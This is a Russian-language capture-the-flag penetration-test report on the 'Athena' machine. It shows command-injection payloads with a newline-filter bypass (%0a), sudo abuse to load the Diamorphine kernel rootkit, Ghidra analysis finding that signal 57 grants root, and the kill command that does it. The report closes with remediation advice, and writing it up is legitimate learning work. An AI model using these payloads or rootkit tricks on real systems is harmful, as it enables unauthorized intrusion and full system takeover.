# Отчет о тестировании на проникновение машины Athena

## Введение

Целевая машина Athena представляет собой сервер под управлением Ubuntu с открытыми портами 22 (SSH), 80 (HTTP), 139 и 445 (SMB). В ходе тестирования была поставлена задача получить root-доступ к системе через эксплуатацию веб-приложения и последующую эскалацию привилегий с использованием руткита Diamorphine.

## Этап 4: Обнаружение Command Injection

### Тестирование параметра ip

При внедрении специальных символов в параметр `ip` сервер возвращал сообщение "Attempt hacking!" для следующих payloads:
```
ip=192.168.130.144|whoami&submit=
ip=192.168.130.144;whoami&submit=
ip=192.168.130.144&&whoami&submit=
```

**Обход фильтрации через перенос строки (%0a):**

Payload:
```
ip=192.168.130.144%0awhoami&submit=
```

**Ответ сервера:**
```
www-data
```

**Объяснение:** Символ `%0a` представляет собой URL-кодированный символ переноса строки (LF, ASCII 10). В некоторых системах при выполнении команд через оболочку символ новой строки интерпретируется как разделитель команд, что позволяет выполнить дополнительную команду после переноса строки. Фильтр проверял наличие символов `;`, `|`, `&&`, но не проверял наличие `%0a`, что позволило обойти защиту.

**Проверка наличия Python:**
```
ip=192.168.130.144%0awhich python3&submit=
```

**Ответ:**
```
/usr/bin/python3
```

**Вывод:** Уязвимость Command Injection подтверждена. Сервер выполняет команды от пользователя `www-data`.

## Этап 7: Эскалация до root через LKM руткит Diamorphine

### Анализ sudo прав

**Выполненная команда:**
```bash
sudo -l
```

**Результат:**
```
User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

**Вывод:** Пользователь `athena` может загружать модуль ядра `venom.ko` с правами root без ввода пароля.


### Анализ модуля venom.ko

**Информация о модуле:**
```bash
modinfo /mnt/.../secret/venom.ko
```

**Результат:**
```
filename:       /mnt/.../secret/venom.ko
description:    LKM rootkit
author:         m0nad
license:        Dual BSD/GPL
srcversion:     93A81462832D4CF52F916D7
depends:        
retpoline:      Y
name:           venom
vermagic:       5.15.0-69-generic SMP mod_unload modversions
```

**Вывод:** Модуль `venom.ko` является LKM (Loadable Kernel Module) руткитом, разработанным автором m0nad. Данный руткит известен как **Diamorphine**.


### Исследование руткита Diamorphine

**Diamorphine** — это руткит уровня ядра для Linux, поддерживающий ядра версий 2.6.x, 3.x, 4.x, 5.x и 6.x на архитектурах x86, x86_64 и ARM64.

**Особенности работы Diamorphine:**

1. **Невидимость модуля:** При загрузке модуль становится невидимым для стандартных средств (lsmod, /proc/modules).
2. **Управление через сигналы:** Взаимодействие с руткитом осуществляется через отправку сигналов процессам.

**Сигналы управления Diamorphine (согласно документации):**

| Сигнал | Действие |
|--------|----------|
| **31** | Скрыть/показать любой процесс |
| **63** | Сделать модуль видимым/невидимым (переключение) |
| **64** | Дать пользователю права root (повышение привилегий) |

**Объяснение механизма работы:**

Руткит перехватывает системные вызовы и изменяет их поведение. При отправке сигнала на любой PID, руткит перехватывает его и вместо стандартной обработки выполняет свое действие. Сигналы 31, 63 и 64 являются пользовательскими (real-time signals) и не используются стандартными приложениями, что позволяет руткиту использовать их для управления.


### Проблема с сигналом 64

При попытке использования стандартного сигнала 64 для получения прав root, происходил разрыв соединения:

```bash
kill -64 0
```

**Наблюдение:** Команда приводила к потере соединения с reverse shell, без получения прав root.

**Анализ проблемы:**

В некоторых версиях Diamorphine или в модифицированных сборках номера сигналов могут быть изменены разработчиком или сборщиком модуля. Сигнал 64 в данной версии мог выполнять другую функцию (например, перезапуск процесса или скрытие модуля), что приводило к завершению текущего shell.


### Реверс-инжиниринг модуля venom.ko

Для определения правильного сигнала, дающего права root, был скачан файл `venom.ko` с целевой машины на атакующую:

```bash
wget http://10.114.138.206:8888/venom.ko
```

**Запуск Ghidra для анализа:**

```bash
ghidra venom.ko
```

В ходе статического анализа с использованием Ghidra (инструмент для реверс-инжиниринга от АНБ) был обнаружен следующий фрагмент кода в обработчике сигналов:

```c
if (iVar3 == 0x39) {
    give_root();
    return 0;
}
```

**Анализ кода:**

| Значение | Десятичный эквивалент | Объяснение |
|----------|----------------------|------------|
| `0x39`   | `57`                 | Шестнадцатеричное число 0x39 соответствует десятичному числу 57 |

**Преобразование:**
```python
>>> hex(57)
'0x39'
```

**Вывод:** В данной сборке руткита сигнал для получения прав root был изменен с 64 на 57. Разработчик или сборщик модуля модифицировал исходный код, изменив номер сигнала, что делает стандартную документацию неактуальной для данной версии.


### Получение root-доступа

**Выполненная команда:**
```bash
kill -57 0
```

**Результат:**
```bash
id
uid=0(root) gid=0(root) groups=0(root),1001(athena)
```

**Вывод:** Сигнал 57 успешно дал права root. Пользователь `athena` стал пользователем `root` (UID 0) с сохранением дополнительной группы `athena` (GID 1001).

## Итоги работы

### Полученные флаги:
- **User flag (athena):** Получен после эскалации до пользователя athena
- **Root flag:** Получен после получения root-доступа

### Критические уязвимости, обнаруженные в ходе тестирования:

1. **Command Injection в параметре ip:** Уязвимость возникла из-за недостаточной фильтрации входных данных в параметре `ip` веб-приложения `/myrouterpanel`. Фильтр проверял наличие символов `;`, `|`, `&&`, но пропускал символ переноса строки (`%0a`), что позволило выполнить произвольные команды на сервере.

2. **Отсутствие проверки целостности скрипта backup.sh:** Файл `/usr/share/backup/backup.sh` был доступен для записи пользователю `www-data` и выполнялся с правами пользователя `athena`, что позволило внедрить reverse shell и получить доступ с повышенными привилегиями.

3. **Некорректная конфигурация sudo:** Пользователю `athena` было разрешено выполнение команды `insmod` для загрузки модуля ядра с правами root без ввода пароля. Данное разрешение позволило загрузить руткит Diamorphine и использовать его для эскалации до root.

4. **Наличие LKM руткита Diamorphine:** Модуль `venom.ko` был специально размещен в системе для предоставления возможности повышения привилегий. Взаимодействие с руткитом осуществляется через пользовательские сигналы, номера которых были изменены (сигнал 57 вместо ожидаемого 64), что было выявлено в ходе реверс-инжиниринга.


## Достижения и выводы

### Достижения:

1. **Обход фильтрации Command Injection:** В ходе тестирования был успешно обойден фильтр, проверяющий наличие символов `;`, `|`, `&&`, с использованием URL-кодированного символа переноса строки (`%0a`). Данный метод позволяет выполнять дополнительные команды в системах, где передаваемые данные подставляются в оболочку без должной санитизации.

2. **Эскалация через модификацию скрипта backup.sh:** В рамках данной работы был использован метод получения доступа к другому пользователю через внедрение reverse shell в скрипт, выполняемый от его имени. Сценарий показал, как отсутствие контроля целостности файлов в общедоступных директориях может привести к компрометации учетной записи.

3. **Эскалация привилегий до root через LKM руткит:** Впервые в рамках данной работы был использован руткит Diamorphine для получения root-доступа. Ключевым моментом стал перебор пользовательских сигналов для определения того, который дает повышение привилегий. В стандартной версии Diamorphine это сигнал 64, однако в данной сборке он был изменен на сигнал 57.

4. **Реверс-инжиниринг модуля ядра с использованием Ghidra:** В ходе работы был использован инструмент Ghidra для статического анализа бинарного файла модуля ядра (venom.ko). Анализ позволил выявить модифицированный номер сигнала (0x39 = 57) и точно определить способ взаимодействия с руткитом. Данный подход демонстрирует важность анализа бинарных файлов в случаях, когда документация не соответствует действительности.

5. **Работа с LKM руткитами:** В ходе выполнения работы был получен практический опыт работы с модулями ядра Linux и их эксплуатацией для повышения привилегий. Особое внимание было уделено анализу поведения модуля через логи ядра (dmesg) и реверс-инжинирингу для определения корректного способа взаимодействия.

### Итоговые выводы:

1. Веб-приложение `/myrouterpanel` критически уязвимо к Command Injection, что позволяет злоумышленнику выполнять произвольные команды на сервере. Рекомендуется заменить вызов системной команды `ping` на использование библиотечных функций (например, `socket` в Python) или жестко ограничить допустимые символы в параметре `ip`.

2. Наличие скриптов, доступных для записи и выполняемых с правами другого пользователя, создает серьезный вектор для горизонтального перемещения. Рекомендуется размещать такие скрипты в директориях с ограниченным доступом и настроить проверку целостности.

3. Разрешение на загрузку модулей ядра с правами root без ввода пароля является критической уязвимостью, так как позволяет злоумышленнику загрузить произвольный код в ядро и получить полный контроль над системой. Рекомендуется либо удалить данное разрешение, либо требовать ввод пароля для его использования.

4. Наличие LKM руткита Diamorphine в системе указывает на то, что система уже была скомпрометирована ранее или модуль был специально размещен для целей тестирования. Несмотря на это, эксплуатация руткита для получения root-доступа подтверждает высокий уровень контроля, который дает загрузка произвольных модулей ядра.

5. Изменение номеров сигналов в рутките (64 → 57) демонстрирует, что даже стандартные инструменты могут быть модифицированы, что требует гибкости и готовности к исследованию нестандартных сценариев. Использование реверс-инжиниринга в таких случаях становится необходимым инструментом для успешного завершения тестирования.
